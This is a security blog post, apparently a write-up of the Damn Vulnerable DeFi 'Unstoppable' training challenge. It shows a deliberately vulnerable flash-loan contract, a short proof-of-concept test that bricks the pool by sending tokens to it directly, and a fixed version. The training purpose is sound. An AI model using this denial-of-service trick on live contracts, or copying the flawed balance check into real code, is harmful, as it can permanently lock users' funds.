# Deep Dive: When the "Internal Ledger" Meets "Harsh Reality" — The DoS Vulnerability in DVDF's Unstoppable Challenge

**Author:** ShiningSugar  
**Date:** 2025-10-31  
**Tags:** Smart Contract Security, DeFi, DoS Attack

-----

## 1. Background: When the "Unstoppable" Pool stopped

This week, I kicked off my journey into the Damn Vulnerable DeFi (DVDF) challenges—a professional training ground designed for security researchers and auditors.

The first challenge, **#1 "Unstoppable"**, presented a very clear objective: I was facing a flash loan pool holding 1 million DVT tokens. The mission wasn't to steal the funds, but to **make it impossible for the pool to execute any new flash loans, ever again.**

This post is my in-depth post-mortem of the challenge. I'll break down how a seemingly harmless "sanity check" becomes a fatal "self-destruct button." The core of this vulnerability lies in the developer confusing two fundamental concepts: the **contract's "Internal Ledger" versus the "External Reality."**

## 2. Code Analysis: The Fatal "Assertion"

The target is the `UnstoppableLender.sol` contract. It's quite simple:

1. It holds an ERC20 token (`DamnValuableToken` or DVT).  
2. It allows users to deposit DVT via `depositTokens()`, updating an "internal ledger" variable named `poolBalance`.  
3. It provides a `flashLoan()` function to lend to users.  

The vulnerability is hidden in `flashLoan()`:

**`// src/Contracts/unstoppable/UnstoppableLender.sol`**

```solidity
contract UnstoppableLender is ReentrancyGuard {
    
    uint256 public poolBalance; 
    IERC20 public damnValuableToken;

    constructor(IERC20 token) {
        damnValuableToken = token;
    }

    function depositTokens(uint256 amount) external {
        require(amount > 0, "Amount must be greater than 0");
        damnValuableToken.transferFrom(msg.sender, address(this), amount);
        poolBalance = poolBalance + amount;
        emit Deposit(msg.sender, amount);
    }

    function flashLoan(uint256 borrowAmount) external nonReentrant {
        if (borrowAmount == 0) revert MustBorrowOneTokenMinimum();

        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));

        if (balanceBefore < borrowAmount) revert NotEnoughTokensInPool();

        if (poolBalance != balanceBefore) revert AssertionViolated(); 

        damnValuableToken.transfer(msg.sender, borrowAmount);
        IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        if (balanceAfter < balanceBefore) revert FlashLoanHasNotBeenPaidBack();
    }
}
```

### Two Key Checks:

1. **【Correct】Repayment Check:** `if (balanceAfter < balanceBefore)`  
   * This is correct and necessary logic for a flash loan, leveraging the **atomicity** of the transaction.  
   * If the borrower fails to return the funds in the callback, the transaction automatically reverts.  

2. **【Fatal】State Assertion:** `if (poolBalance != balanceBefore)`  
   * This is where the bug lives.  
   * `poolBalance` is *only* updated in `depositTokens()`, while `balanceBefore` is the *real-time* balance.  
   * The developer failed to realize that the standard `transfer` function of an ERC20 token could be used as an attack vector.  

Here is the code snippet for the `transfer` function, from ERC20.sol:

```solidity
function transfer(address to, uint256 amount) public virtual override returns (bool) {
    address owner = _msgSender();
    _transfer(owner, to, amount);
    return true;
}
```

## 3. The Attack (PoC): Breaking the Assertion

Attack Goal: Force **poolBalance** and **balanceBefore** out of sync.

Method: Instead of calling `depositTokens()`, just send DVT directly to the contract address. The *balance* increases, but the *ledger* doesn't.

**`// test/unstoppable/Unstoppable.t.sol`**

```solidity
function testExploit() public {
    vm.startPrank(attacker);

    dvt.transfer(
        address(unstoppableLender),
        INITIAL_ATTACKER_TOKEN_BALANCE
    );
    
    vm.stopPrank();

    vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
    validation();
}
```

At this point:

- `poolBalance = 1,000,000e18`  
- `balanceOf = 1,000,100e18`  

From now on, the assertion is broken beyond repair and the contract is permanently "bricked".

## 4. Defense & Fix: Trust the Ledger, Not the Reality

The Fix: Trust the internal ledger, not the external balance.

```solidity
function flashLoan(uint256 borrowAmount) external nonReentrant {
    if (borrowAmount == 0) revert MustBorrowOneTokenMinimum();

    if (poolBalance < borrowAmount) revert NotEnoughTokensInPool();

    damnValuableToken.transfer(msg.sender, borrowAmount);
    IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);

    uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
    if (balanceAfter < poolBalance) revert FlashLoanHasNotBeenPaidBack();
}
```

After the fix:

1. It only lends funds based on its internal ledger.  
2. It no longer self-destructs from a state mismatch.  
3. It now checks the final balance against the internal ledger, not the pre-loan balance.  

## 5. Conclusion: Key Lessons

1. **ERC20 Tokens Cannot Be Rejected**: A contract must always account for passively receiving tokens.  
2. **`assert` vs. `require`**:  
   * `require` is for validating *external* inputs.  
   * `assert` is for checking *internal* invariants. And `poolBalance == balanceBefore` was clearly not an invariant.  

This challenge was a great reminder that in smart contract security, the devil is often in the assumptions.